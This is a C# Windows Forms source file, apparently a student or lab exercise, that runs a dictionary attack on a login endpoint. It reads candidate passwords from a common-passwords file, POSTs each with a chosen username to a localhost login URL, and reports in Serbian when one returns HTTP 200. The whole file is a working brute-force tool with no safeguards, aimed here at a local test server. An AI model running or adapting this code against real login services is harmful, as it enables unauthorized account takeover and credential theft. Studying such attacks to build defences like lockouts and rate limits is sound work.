using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DictionaryAttack
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            var user = new User();
            user.Username = textBox1.Text;
            StreamReader file = new StreamReader("commonusedpasswords.txt");
            string password;
            while ((password = file.ReadLine()) != null)
            {
                user.Password = password;
                HttpStatusCode response =  await SendRequest(user);
                if(response == HttpStatusCode.OK) 
                {
                    MessageBox.Show("Lozinka uspešno pogođena!\n Lozinka je: " + password);
                    return;
                }
            }
            MessageBox.Show("Lozinka nije pogođena!");
        }
        private async Task<HttpStatusCode> SendRequest(User user)
        {
            var json = JsonConvert.SerializeObject(user);
            var data = new StringContent(json, Encoding.UTF8, "application/json");

            var url = "http://localhost:56027/login/DictionaryAttack";
            var client = new HttpClient();

            var response = await client.PostAsync(url, data);

            return response.StatusCode;
        }
    }
}
